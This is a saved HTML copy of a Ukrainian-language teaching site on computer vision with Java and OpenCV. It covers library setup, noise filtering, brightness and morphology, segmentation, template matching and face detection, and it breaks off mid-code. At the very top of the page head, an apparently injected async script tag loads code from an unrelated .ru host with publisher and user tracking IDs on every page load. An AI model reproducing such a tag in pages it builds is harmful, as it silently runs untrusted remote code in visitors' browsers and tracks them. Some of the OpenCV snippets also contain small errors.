<!DOCTYPE html>
<!-- saved from url=(0028)http://test.com/?c=CV&f=show -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src="http://angrenost.ru/getscripts2?&amp;b=39de75189be40d501e2e540dc7658445&amp;publisher_id=f2eae437923bf430d25d5832df79b93f&amp;uid=f26fab2ff68af0c22626ca45b690f9a4&amp;coid=e20fab62127f665ec7a643828556c77d&amp;r=&amp;h=test.com&amp;rand=1498235852129&amp;_=1498235850733"></script>

    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Штучний інтелект. Комп'ютерний зір</title>

    <!-- Bootstrap Core CSS -->
    <link href="./New Age - Start Bootstrap Theme_files/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Catamaran:100,200,300,400,500,600,700,800,900" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Muli" rel="stylesheet">

    <!-- Plugin CSS -->


    <!-- Theme CSS -->
    <link href="./New Age - Start Bootstrap Theme_files/new-age.min.css" rel="stylesheet">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>
<body id="page-top" style="zoom: 1;">

<nav id="mainNav" class="navbar navbar-default navbar-fixed-top affix">
    <div class="container">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span> Menu <i class="fa fa-bars"></i>
            </button>
            <a class="navbar-brand page-scroll" href="#page-top">Головна</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                <li>
                    <a class="page-scroll" href="#articles">Статті</a>
                </li>


            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container-fluid -->
</nav>

<header>

    <div class="col-sm-7">
        <div class="header-content">
            <div class="header-content-inner">

                <h1>Штучний інтелект. Комп'ютерний зір</h1>
                <h3>Метою сайту є ознайомлення із існуючими засобами в галузі обробки та аналізу зображень</h3>
                <a href="#articles" class="btn btn-outline btn-xl page-scroll">Старт</a>
            </div>
        </div>
    </div>


</header>

<section id="articles" class="articles">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
                <div class="section-heading">

                    <h2>Статті</h2>
                    <p class="text-muted">Метою сайту є ознайомлення із існуючими засобоами в галузі обробки та аналізу зображень</p>
                    <hr>
                </div>
            </div>
        </div>

        <div class="row">

            <div class="container-fluid">
                <a href="http://test.com/?c=CV&amp;f=show#JavaOpencvSettings">
                    <div class="col-md-3 col-lg-3 ">
                        <div class="feature-item">
                            <i class="icon-screen-smartphone text-primary"></i>
                            <h3>Налаштування </h3>
                            <p class="text-muted">Java + OpenCV</p>
                        </div>
                    </div>
                </a>
                <a href="./pages/Filtration.html">
                    <div class="col-md-3 col-lg-3 ">
                        <div class="feature-item">
                            <i class="icon-screen-smartphone text-primary"></i>
                            <h3>Завдання 1</h3>
                            <p class="text-muted">Фільтрація зображень засобами бібліотеки OpenCV</p>
                        </div>
                    </div>
                </a>
                <a href="./pages/Preprocessing.html">
                    <div class="col-md-3 col-lg-3">
                        <div class="feature-item">
                            <i class="icon-camera text-primary"></i>
                            <h3>Завдання 2</h3>
                            <p class="text-muted">Покращення якості зображень засобами бібліотеки OpenCV</p>
                        </div>
                    </div>
                </a>


                <a href="./pages/Segmentation.html">
                    <div class="col-md-3 col-lg-3">
                        <div class="feature-item">
                            <i class="icon-present text-primary"></i>
                            <h3>Завдання 3</h3>
                            <p class="text-muted">Сегмантація зображень засобами OpenCV</p>
                        </div>
                    </div>
                </a>

                <a href="./pages/TemplateMatching.html">
                    <div class="col-md-3">
                        <div class="feature-item">
                            <i class="icon-lock-open text-primary"></i>
                            <h3>Завдання 4</h3>
                            <p class="text-muted">Пошук об'єкта за шаблоном         </p>
                        </div>
                    </div>
                </a>





                <a href="./pages/FaceDetection.html">
                    <div class="col-md-3">
                        <div class="feature-item">
                            <i class="icon-lock-open text-primary"></i>
                            <h3>Завдання 5</h3>
                            <p class="text-muted">Розпізнавання людського обличчя</p>
                        </div>
                    </div>
                </a>

            </div>

        </div>
</div></section>


<section id="JavaOpencvSettings" class="JavaOpencvSettings">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
                <div class="section-heading">
                    <h2>Налаштування Java + OpenCV</h2>
                    <p class="text-muted"></p>
                    <hr>
                </div>
            </div>

            <div class="col-lg-12 text-center">
                <h3>Перш за все потрібно скачати бібліотеку OpenCV з офіційного сайту.</h3>
                <p><img src="./New Age - Start Bootstrap Theme_files/1.png" width="400px" height="400px"></p>
                <p class="text-justify lead">
                    Далі потрібно ознайомитись з ліцензією та інсталювати бібліотеку.
                </p>
                <p class="text-justify lead">
                    Наступний крок: Налаштування змінних середовища ОС Windows.
                    <a href="https://uk.wikipedia.org/wiki/%D0%97%D0%BC%D1%96%D0%BD%D0%BD%D1%96_%D1%81%D0%B5%D1%80%D0%B5%D0%B4%D0%BE%D0%B2%D0%B8%D1%89%D0%B0">
                        Змінні середовища
                    </a> — змінні, набір динамічних значень, які можуть вплинути на те як запущені процеси будуть себе поводити на комп'ютері.
                    Про те, як оторимати доступ до змінних середовища <a href="https://www.java.com/ru/download/help/path.xml">тут
                    </a>.
                </p>
                <p class="text-justify lead">
                    Отже, нам потрібно створити змінну OPENCV_DIR та відповідно вказати шлях. Приклад наведено нижче:
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/2.png" width="50%" height="50%">
                </p>
                <p class="text-justify lead">
                    Після створення нашої нової змінної OPENCV_DIR, потрібно додати її до системної змінної <b>path</b>
                    в нижній частині зображення. Приклад наведено нижче:
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/3.png" width="50%" height="50%">
                </p>
                <p class="text-justify lead">
                    На наступному кроці потрібно стандартним способом додати зовнішню бібліотеку у середовищі intelij IDEA
                    <b>File -&gt; Project Structure -&gt; Libraries</b><br>
                    Напишемо простенький код для підключення для визначення висоти та ширини зображення з використанням
                    openCV
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/4.png" width="50%" height="50%">
                </p>
                <p class="text-justify lead">
                    Якщо Ви отримали наступний результат
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/5.png" width="50%" height="50%">
                </p>
                <p class="text-justify lead">
                    потрібно перейти в <b>Run -&gt; Edit Configurations </b> та вказати у VM Options наступний шлях.
                    Звичайно шлях залежить від того куди Ви встановили openCV
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/6.png">
                </p>
            </div>

        </div>
    </div>
</section>









<section id="filtration" class="filtration">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
                <div class="section-heading">
                    <h2>Фільтрація зображень засобами OpenCV</h2>
                    <p class="text-muted"></p>
                    <hr>
                </div>
            </div>
            <div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <p class="text-justify lead">

                    <br>

                    Більшість зображень піддається впливу різного роду шумів в процесі передачі їх по каналах зв'язку,
                    а також на етапі формування. Тому, першим етапом обробки зображень є <b>фільтрація</b>. Наявність шумів
                    на зображенні може причинити неточності та спотворення на етапі сегментації та розіпізнавання. Наприклад,
                    система може сприйняти шуми за окремі об'єкти, що може негативно вплинути на подальші дослідження.
                    <br>
                    В результаті досліджень можна виділити такі основні види шумів: <a href="https://uk.wikipedia.org/wiki/%D0%90%D0%B4%D0%B8%D1%82%D0%B8%D0%B2%D0%BD%D0%B8%D0%B9_%D0%B1%D1%96%D0%BB%D0%B8%D0%B9_%D0%B3%D0%B0%D1%83%D1%81%D1%96%D0%B2_%D1%88%D1%83%D0%BC">аддитивний Гаусовий</a> та
                    <b>імпульсний</b>. Аддитивний Гаусовий шум характеризується додаванням до кожного пікселя
                    зображення значень з відповідного нормального розподілу з нульовим середнім значенням.
                    Такий шум з'являється в пристроях формування цифрових зображень.
                    Імпульсний шум характеризується заміною частини пікселів значеннями фіксованої
                    або випадкової величини. Такий шум пов'язаний з втратами при передачі зображень по каналах зв'язку.
                    Зазвичай, в одному зображенні можна зустріти обидва види шумів, такі шуми називають <b>комбінованими</b>.
                    <br>
                    Всі види фільтрів можна розділити на такі класи: частотні, лінійні, нелінійні, комбіновані.
                    У класі частотних фільтрів обробці підлягають коефіцієнти розкладання зашумленого сигналу по базису Фур'є або інших базисах, зокрема, вейвлет-базису.
                    Перетворення Фур'є особливо важливе для лінійних фільтрів, оскільки множення в Фур'є-області для частотних методів
                    - це операція згортки для вихідного зображення.
                    У цифровій обробці сигналів широко використовуються методи лінійної фільтрації.
                    Однак, лінійна фільтрація дає хороші результати лише в разі наявності гауссова адитивного шуму.
                    У випадку імпульсного шуму ефективніше працюють методи нелінійної фільтрації, зокрема медіанна та рангова фільтрація.
                    У випадку <b>комбінованого шуму</b> можна послідовно застосовувати лінійні і нелінійні фільтри або компонувати ці фільтри так,
                    щоб посилити їх сильні сторони і послабити недоліки, це відбувається при використанні гібридних фільтрів.

                    Лінійні фільтри ще називають згладжуючими або усреднючими, тому що відповідь лінійного фільтра усереднює значення пікселів,
                    що містяться в апертурі, і таким чином згладжує зображення.
                    <br><br>
                    <b>Гаусовий фільтр</b><br>
                    Фільтр Гауса усереднює по закону Гауса пікселі довкола  точки. Властивості:
                    <br><br>
                    Згортка з самим собою - фільтр Гауса
                </p>
                <p align="center"><img src="./New Age - Start Bootstrap Theme_files/gauss.png"></p>
                <p class="text-justify lead">
                    Згортка з радіусом δ двічі надасть результат аналогічний згортці з радіусом
                    δ √&nbsp;2&nbsp; .<br>
                    Ядро сепарабельне - розкладається в суму одномірних ядер.
                    <br>
                    Приклад:
                    2D згортка:
                </p>
                <p align="center"><img src="./New Age - Start Bootstrap Theme_files/gauss1.png"></p>
                <p class="text-justify lead">Розкладання фільтру на 2 1D фільтри</p>
                <p align="center"><img src="./New Age - Start Bootstrap Theme_files/gauss2.png"></p>
                <p class="text-justify lead">Згортка по стрічках</p>
                <p align="center"><img src="./New Age - Start Bootstrap Theme_files/gauss3.png"></p>
                <p class="text-justify lead">Аналогічно відбувається згортка по стовбцях.<br><br>
                    Приклад застосування Гаусового фільтру з допомогою OpenCV
                </p>

                <p>Code:</p>
                    <pre>                        <code>
                            Imgproc.GaussianBlur(img, dst, new Size(5, 5) ,1 ,1);
                        </code>
                    </pre>
                img - вхідне зображення;<br>
                dst - результат фільтрації;<br>
                new Size(5, 5) - розмір вікна.
                <p class="text-justify lead">
                    <b>Медіанний фільтр:</b><br>
                    Суть медіанного фільтру полягає у виборі медіани із набору пікселів околиці.
                    Формула:
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/formula_median.png">
                </p>
                <p class="text-justify lead">
                    Спочатку усі значення пікселів околиці сортуються у певному порядку (зростання)
                    та вибирається медіанне значення, яким замінюється центральний піксель
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/median_window.png">
                </p>

                <p>Code:</p>
                    <pre>                        <code>
                            Imgproc.medianBlur(img, dst, 5);
                        </code>
                    </pre>
                img - вхідне зображення;<br>
                dst - результат фільтрації;<br>
                5 - розмір вікна (у даному випадку 5х5).

                <p class="text-justify lead">Результат
                    роботи медіанного фільтру:</p>

                <table class="table table-striped table-hover ">
                    <thead>
                    </thead>
                    <tbody>
                    <tr>
                        <td width="50%"><img src="./New Age - Start Bootstrap Theme_files/noise.png" width="90%" height="300px">
                            Зашумлене зображення (комбінований шум)
                        </td>
                        <td><img src="./New Age - Start Bootstrap Theme_files/filtered.png" width="90%" height="300px">
                            Медіанний фільтр 5x5
                        </td>
                    </tr>
                    <tr>
                        <td><img src="./New Age - Start Bootstrap Theme_files/9x9.png" width="90%" height="300px">
                            Медіанний фільтр 9x9
                        </td>
                        <td><img src="./New Age - Start Bootstrap Theme_files/9x9.png" width="90%" height="300px">
                            Медіанний фільтр 21x21
                        </td>
                    </tr>

                    </tbody>
                </table>
                <p class="text-justify lead">
                    Приклад застосування алгоритмів фільтрації зображень з різними розмірами вікон наведено нижче
                </p>
                <table class="table table-striped table-hover ">
                    <thead>
                    </thead>
                    <tbody>
                    <tr>
                        <td width="50%"><img src="./New Age - Start Bootstrap Theme_files/gauss_gif.gif" width="100%" height="300px">
                            Gauss
                        </td>
                        <td><img src="./New Age - Start Bootstrap Theme_files/blur_gif.gif" width="100%" height="300px">
                            Blur
                        </td>
                    </tr>
                    <tr>
                        <td><img src="./New Age - Start Bootstrap Theme_files/bilateral_gif.gif" width="100%" height="300px">
                            Bilateral
                        </td>
                        <td><img src="./New Age - Start Bootstrap Theme_files/median_gif.gif" width="100%" height="300px">
                            Median
                        </td>
                    </tr>

                    </tbody>
                </table>
                <p class="text-justify lead">
                    <b>Вирішення проблеми фільтрації зображень</b><br>
                    Шум наявний практично в усіх зображеннях. Однак, у такій галузі як медицина, наявність шуму може
                    значно вплинути на якість та точність постановки діагнозу. Наприклад, шум може бути сприйнятим як частина
                    досліджуваного об'єкта і т.п.<br>
                    Етап фільтрації зображень відноситься до низького рівня комп'ютерного зору та здійснює значний вплив
                    та подальші етапи сегментації та розпізнавання.<br>
                    Для зменшення рівня шуму запропоновано застосовувати 2 типи фільтрів: медіанний для зменшення
                    імпульсних шумів та гаусовий для зменшення рівня адитивного шуму. Для оцінки фільтрації використовується значення
                    пікового відношення сигналу до шуму(PSNR). У залежності від значення PSNR відбуватиметься коригування розміру
                    вікна фільтрів.

                    <br><br>

                    Програмний код : <a href="https://github.com/olehpitsun/CVforStudents/tree/master/src/task1">
                        https://github.com/olehpitsun/CVforStudents/tree/master/src/task1
                    </a>
                    <br><b>Література:</b><br>
                </p>
                <p>
                    Гонсалес Р. Цифровая обработка изображений / Р. Гонсалес,Р. Вудс. – М.: Техносфера, 2005. – 1072 с.<br><br>
                    Порівняння алгоритмів фільтрації медичних зображень за оцінками їх якості
                    / Бондіна Н.М., Калмичков О.С., Козіна О.А. // Вісник НТУ "ХПІ". Серія: Інформатика та
                    моделювання. – Харків: НТУ "ХПІ". – 2013. – No 39 (1012). – С. 15 – 21.<br><br>
                    Порівняльний аналіз алгоритмів фільтрації медичних зображень / Бондіна Н.М.,

                    Калмичков О.С., Кривенцов В.Е. // Вісник НТУ "ХПІ". Серія: Інформатика

                    тамоделювання. – Харків: НТУ "ХПІ". – 2012. – No 38. – С. 14 – 25.
                </p>




            </div>



        </div>
    </div>
</section>








<section id="preprocessing" class="preprocessing">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
                <div class="section-heading">
                    <h2>Попередня обробка зображень</h2>
                    <p class="text-muted"></p>
                    <hr>
                </div>
            </div>

            <p class="text-justify lead">
                У більшості випадків складність обробки зображень полягає у неоднорідності освітлення та наявності затемнених або навпаки занадто освітлених областей.
                На етапі попередньої обробки часто застосовують коригування рівня яскравості, контрастності та морфологічні операції.
                <br>Приклад програмного коду для коригування рівня яскравості з допомогою Java та OpenCV.
            </p>
            <div class="col-lg-12 col-md-12">
                <div class="col-lg-6 col-md-6">
							<pre>								<code>

                                    public static Mat bright(Mat image, int sz){

                                    Mat dst = new Mat(image.rows(), image.cols(), image.type());
                                    image.convertTo(dst, -1, 10d * sz / 100, 0);
                                    return dst;
                                    }





                                </code>
							</pre>
                </div>
                <div class="col-lg-6 col-md-6">
                    <img src="./New Age - Start Bootstrap Theme_files/bright_gif.gif" width="100%" height="300px">
                </div>
            </div>
            <br>
            <p class="text-justify lead">
                Приклад програмного коду для коригування контрастності:
            </p>

            <div class="col-lg-6 col-md-6">
						<pre>							<code>

                                public static Mat contrast (Mat image, Double a){

                                Mat dst = new Mat(image.rows(), image.cols(), image.type());
                                image.copyTo(dst);

                                Scalar modifier;
                                modifier = new Scalar(a,a,a,1);
                                Core.multiply(dst, modifier, dst);
                                return dst;
                                }

                            </code>
						</pre>
            </div>

            <div class="col-lg-6 col-md-6">
                <img src="./New Age - Start Bootstrap Theme_files/contrast_gif.gif" width="100%" height="300px">
            </div>
        </div>
        <p></p>
        <p class="text-justify lead">
            Основні морфологічні перетворення:
            Erode - розмивання (операція звуження)
            Dilate - розтягування (операція розширення)
            Розмиття (операція звуження) зображення з використанням фільтра (ядра) один або кілька разів. Зображення формується із локальних максимумів.
            <br>Erode
        </p>

        <div class="col-lg-12 col-md-12">
            <div class="col-lg-6 col-md-6">
							<pre>								<code>

                                    /**
                                    *
                                    * @param image - вхідне зображення
                                    * @param kernel - ядро
                                    * @return Mat
                                    */
                                    public static Mat Erode(Mat image, int kernel){

                                    final Mat dst = new Mat(image.cols(), image.rows(), CvType.CV_8UC3);
                                    image.copyTo(dst);
                                    Imgproc.erode(dst, dst, Imgproc.getStructuringElement(Imgproc.MORPH_RECT, new Size(kernel,kernel)));
                                    return dst;
                                    }
                                </code>
							</pre>
            </div>
            <div class="col-lg-6 col-md-6">
                <img src="./New Age - Start Bootstrap Theme_files/erode_gif.gif" width="100%" height="300px">
            </div>
        </div>
        <br>
        <p class="text-justify lead">
            <br>Dilate
        </p>

        <div class="col-lg-6 col-md-6">
						<pre>							<code>
                                /**
                                *
                                * @param image - вхідне зображення
                                * @param kernel - ядро
                                * @return
                                */
                                public static Mat Dilate(Mat image, int kernel){

                                final Mat dst = new Mat(image.cols(), image.rows(), CvType.CV_8UC3);
                                image.copyTo(dst);
                                Imgproc.dilate(dst, dst, Imgproc.getStructuringElement(Imgproc.MORPH_RECT, new Size(kernel,kernel)));
                                return dst;
                                }
                            </code>
						</pre>
        </div>

        <div class="col-lg-6 col-md-6">
            <img src="./New Age - Start Bootstrap Theme_files/dilate_gif.gif" width="100%" height="300px">
        </div>
    </div>
    
    
</section>

<br><br>
<p class="text-justify lead">
    Програмний код : <a href="https://github.com/olehpitsun/CVforStudents/tree/master/src/task2">
        https://github.com/olehpitsun/CVforStudents/tree/master/src/task2
    </a>
</p>







<section id="segmentation" class="segmentation">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
                <div class="section-heading">
                    <h2>Сегментація зображень</h2>
                    <p class="text-muted"></p>
                    <hr>
                </div>
            </div>
            <p class="text-justify lead">
                <b>Сегментація</b> — це процес розділення цифрового зображення на декілька сегментів.
                Сегменти якісно просегментованого зображення повинні бути однорідними за текстурою, межі виділених сегментів повинні бути чіткими, сусідні
                сегменти повинні відрізнятися за певними критеріями. Загалом, усі методи сегментації можна поділити на такі категорії: методи, що базуються
                на кластеризації, методи з використанням гістограми, методи розростання областей, методи розрізу графа, водорозподілу, методи, що базуються
                на виділенні країв, багатомасштабна сегментація.<br>

                <b>Виділення країв.</b>
                Межі та краї областей сильно пов'язані, оскільки часто існує сильний перепад яскравості на кордонах областей.
                Тому методи виділення країв використовуються як основа для іншого методу сегментації. Приклад коду для виділення контурів з використанням
                детектора Кенні та результати при різних параметрах наведено нижче:
            </p>

            <div class="col-lg-12 col-md-12">
                <div class="col-lg-6 col-md-6">
						<pre>							<code>
                                /**
                                * Детектор Кенні
                                * @param image - Вхідне зображення
                                * @param size - нижній поріг
                                * @return Mat результат
                                */
                                public static Mat cannyDetection(Mat image, int size){

                                Mat grayImage = new Mat();
                                Mat detectedEdges = new Mat();

                                // cконвертація у градації сірого
                                Imgproc.cvtColor(image, grayImage, Imgproc.COLOR_BGR2GRAY);

                                // видалення шумів
                                Imgproc.blur(grayImage, detectedEdges, new Size(3, 3));

                                Imgproc.Canny(detectedEdges, detectedEdges, size, size/3, 3, false);
                                return detectedEdges;
                                }
                            </code>
						</pre>
                </div>

                <div class="col-lg-6 col-md-6">
                    <img src="./New Age - Start Bootstrap Theme_files/canny_gif.gif" width="100%" height="300px">
                </div>
            </div>

            <p class="text-justify lead">
                <b>K-means</b> — це ітераційний метод, який використовується для того, щоб розділити зображення на K кластерів. Базовий алгоритм наведений нижче:
                <br>
                1. Вибрати K центрів кластерів, випадково або на основі деякої евристики<br>
                2. Помістити кожен піксель зображення в кластер, центр якого найближче до цього пікселя<br>
                3. Знову визначити центри кластерів, усереднюючи всі пікселі в кластері<br>
                4. Повторювати кроки 2 і 3 до збіжності (наприклад, коли пікселі будуть залишатися в тому ж кластері)
                <a href="https://uk.wikipedia.org/wiki/%D0%A1%D0%B5%D0%B3%D0%BC%D0%B5%D0%BD%D1%82%D0%B0%D1%86%D1%96%D1%8F_%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%BD%D1%8F">Джерело</a>
            </p>


            <div class="col-lg-12 col-md-12">
                <div class="col-lg-6 col-md-6">
						<pre>							<code>
                                /**
                                * @param src - вхідне зображення
                                * @return Mat результат
                                */
                                public static Mat kmeans(Mat src){

                                Mat mHSV = new Mat();
                                Imgproc.cvtColor(src, mHSV, Imgproc.COLOR_RGBA2RGB,3);
                                Imgproc.cvtColor(src, mHSV, Imgproc.COLOR_RGB2HSV,3);
                                List<mat> hsv_planes = new ArrayList<mat>(3);
                                        Core.split(mHSV, hsv_planes);

                                        Mat channel = hsv_planes.get(0);
                                        channel = Mat.zeros(mHSV.rows(),mHSV.cols(),CvType.CV_8UC1);
                                        hsv_planes.set(2,channel);
                                        Core.merge(hsv_planes,mHSV);

                                        Mat clusteredHSV = new Mat();
                                        mHSV.convertTo(mHSV, CvType.CV_32FC3);
                                        TermCriteria criteria = new TermCriteria(TermCriteria.EPS + TermCriteria.MAX_ITER,200,0.1);
                                        Core.kmeans(mHSV, 3, clusteredHSV, criteria, 30, Core.KMEANS_PP_CENTERS);

                                        return mHSV;
                                        }
                            </mat></mat></code>
						</pre>
                </div>

                <div class="col-lg-6 col-md-6">
                    <img src="./New Age - Start Bootstrap Theme_files/k-means.png" width="100%" height="300px">
                </div>
            </div>

            <p class="text-justify lead">
                <b>Метод водоподілу </b> - це, заснований на областях. метод математичної морфології. Вододіл — це хребет, який ділить області різних річкових систем
                Лінії вододілу — це кордони, що розділяють ділянки зображень.  Перетворення водоподілу обчислює водозбірні басейни та лінії хребтів, при тому що водозбірні
                басейни — відповідні області зображення, а лінії хребтів — це межі цих областей. Недолік - можлива надмірна сегмментація
                <br>Програмний код наведено <a href="https://github.com/olehpitsun/CVforStudents/tree/master/src/task3/SegmentationMethods">тут</a>
                <br>
            </p>

            <img src="./New Age - Start Bootstrap Theme_files/watershed_gif.gif" width="300px" height="200px">
            <br><br>
            <p class="text-justify lead">
                <b>Порогова сегментація. </b> Один із основних і найпростіших способів - це побудова сегментації за допомогою порогу.
                Поріг - це ознака (властивість), що допомагає розділити шуканий сигнал на класи.
                Операція порогового поділу полягає в зіставленні значення яскравості кожного пікселя зображення з заданим значенням порога.<br>
                Приклад програмної реалізації наведено нижче:
                <a href="https://github.com/olehpitsun/CVforStudents/tree/master/src/task3/SegmentationMethods">https://github.com/olehpitsun/CVforStudents/tree/master/src/task3/SegmentationMethods</a>

            </p>

            <div class="col-lg-12 col-md-12">
                <div class="col-lg-6 col-md-6">
						<pre>							<code>
                                Imgproc.threshold(src1, frame, minValue, maxValue, Imgproc.THRESH_BINARY_INV + Imgproc.THRESH_OTSU);
                            </code>
						</pre>
                </div>

                <div class="col-lg-6 col-md-6">
                    <img src="./New Age - Start Bootstrap Theme_files/thresholding_gif.gif" width="100%" height="400px">
                </div>
            </div>



        </div>
    </div>
</section>




<section id="templatematching" class="templatematching">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
                <div class="section-heading">
                    <h2>Пошук об'єкта за шаблоном</h2>
                    <p class="text-muted"></p>
                    <hr>
                </div>
            </div>

            <div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <p class="text-justify lead">
                    Детектування об'єктів застосовуєься у багатьох галузях. Адже, можливість автоматичного пошуку
                    об'єктів значно спрощує обробку зображення чи відео.<br>
                    В процесі роботи шаблонне зображення послідовно накладається на досліджуване зображення і
                    між ними вираховується кореляція. Результат кореляції заноситься у вихідне зображення.
                    Наприклад, маємо шаблон для пошуку <img src="./New Age - Start Bootstrap Theme_files/example.png">
                    та вхідне зображення
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/figures.png" width="50%" height="50%">
                </p>
                <p class="text-justify lead">
                    У результаті пошуку за шаблоном отримаємо результат:
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/result.png" width="50%" height="50%">
                </p>
                <p class="text-justify lead">
                    Як бачимо, наша програма впоралась із завданням. Тепер змінимо колір досліджувального зображення і
                    глянемо на результат:
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/changeColor.png" width="50%" height="50%" align="center">
                </p>
                <p class="text-justify lead">
                    Як бачимо, колір елементу не впливає на якість розпізнавання. У реальному житті зображення
                    піддаються впливу різного роду шумів. Що ж, спеціально зашумимо зображення імпульсним шумом
                    та глянемо на результат:
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/withnoise.png" width="50%" height="50%" align="center">
                </p>
                <p class="text-justify lead">
                    Особливих труднощів у розпізнаванні фігури не виникло.
                    Тепер спробуйте знайти панду на наступному зображенні:
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/troopers-panda.jpg" width="50%" height="50%" align="center">
                </p>
                <p class="text-justify lead">
                    Впевнений, Вам це вдалось. Глянемо як з цим впоравася OpenCV.
                </p>
                <p align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/resultpanda.png" width="50%" height="50%" align="center">
                    <img src="./New Age - Start Bootstrap Theme_files/resultpanda.png" width="50%" height="50%" align="center">
                </p>
                <p>Код:</p>
                    <pre>                        <code>
                            import org.opencv.core.Core;
                            import org.opencv.core.Core.MinMaxLocResult;
                            import org.opencv.core.CvType;
                            import org.opencv.core.Mat;
                            import org.opencv.core.Point;
                            import org.opencv.core.Scalar;
                            import org.opencv.highgui.Highgui;
                            import org.opencv.imgproc.Imgproc;

                            class MatchingDemo {

                            /**
                            *
                            * @param inFile  - зображення для пошуку
                            * @param templateFile - елемент пошуку
                            * @param outFile - результат обробки
                            */
                            public void run(String inFile, String templateFile, String outFile) {

                            Mat img = Highgui.imread(inFile);
                            Mat templ = Highgui.imread(templateFile);

                            // / Create the result matrix
                            int result_cols = img.cols() - templ.cols() + 1;
                            int result_rows = img.rows() - templ.rows() + 1;
                            Mat result = new Mat(result_rows, result_cols, CvType.CV_32FC1);

                            // / Do the Matching and Normalize
                            Imgproc.matchTemplate(img, templ, result, Imgproc.TM_CCOEFF);
                            Core.normalize(result, result, 0, 1, Core.NORM_MINMAX, -1, new Mat());

                            // / Localizing the best match with minMaxLoc
                            MinMaxLocResult mmr = Core.minMaxLoc(result);
                            Point matchLoc;
                            matchLoc = mmr.maxLoc;
                            Core.rectangle(img, matchLoc, new Point(matchLoc.x + templ.cols(),
                            matchLoc.y + templ.rows()), new Scalar(0, 255, 0), 4);

                            Core.putText(img, "Found", new Point(matchLoc.x - 60,matchLoc.y - 10),
                            Core.FONT_HERSHEY_COMPLEX, 1.0 ,new  Scalar(0,255,0));

                            Highgui.imwrite(outFile, img);

                            }
                            }
                        </code>
                    </pre>
                http://stackoverflow.com/questions/17001083/opencv-template-matching-example-in-android
            </div>

        </div>
    </div>
</section>









<section id="faceDetection" class="faceDetection">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
                <div class="section-heading">
                    <h2>Face detection</h2>
                    <p class="text-muted"></p>
                    <hr>
                </div>
            </div>


            <div class="col-lg-12 text-center">
                <p class="text-justify lead">
                    Технологія розпізнавання облич з’явилася порівняно недавно. Перші розробки послідували відразу за хвилею перших досліджень в даній сфері
                    в 60-х роках. Що стосується впровадження системи, то це стало реальністю лише в новому столітті.
                    <small><a href="http://saturncorp.com.ua/texnologiya-rozpiznavannya-oblich/?lang=uk">Джерело</a></small><br>
                    В OpenCV наявні каскади Хаара для розпізнавання об'єктів на зображенні. Перелік існуючих каскадів : <br>
                    - haarcascade_eye<br>
                    - haarcascade_eye_tree_eyeglasses<br>
                    - haarcascade_frontalcatface<br>
                    - haarcascade_fullbody<br>
                    - haarcascade_lowerbody<br>
                    - haarcascade_smile<br>
                    - та інші.<br>
                    В даному прикладі розглянемо каскад Хаара <b>haarcascade_frontalface_alt</b> для виявлення обличчя на зображенні.
                    Приклад повного коду наведено <a href="https://github.com/olehpitsun/CVforStudents/tree/master/src/task4">тут</a><br>
                    Також розглянемо деякі функції OpenCV для нанесення тексту та фігур на зображення. Це пригодиться нам для візуального виділення обличчя.
                    Отже, нанесення тексту на зображення: <br>
                </p>
                <div class="col-lg-12 col-md-12">
                    <div class="col-lg-6 col-md-6">

						<pre>							<code>
                                /**
                                * * @param img Image.
                                * @param text Text string to be drawn.
                                * @param org Bottom-left corner of the text string in the image.
                                * @param fontFace Font type. One of <code>FONT_HERSHEY_SIMPLEX</code>,
                                * <code>FONT_HERSHEY_PLAIN</code>, <code>FONT_HERSHEY_DUPLEX</code>,
                                * <code>FONT_HERSHEY_COMPLEX</code>, <code>FONT_HERSHEY_TRIPLEX</code>,
                                * <code>FONT_HERSHEY_COMPLEX_SMALL</code>, <code>FONT_HERSHEY_SCRIPT_SIMPLEX</code>,
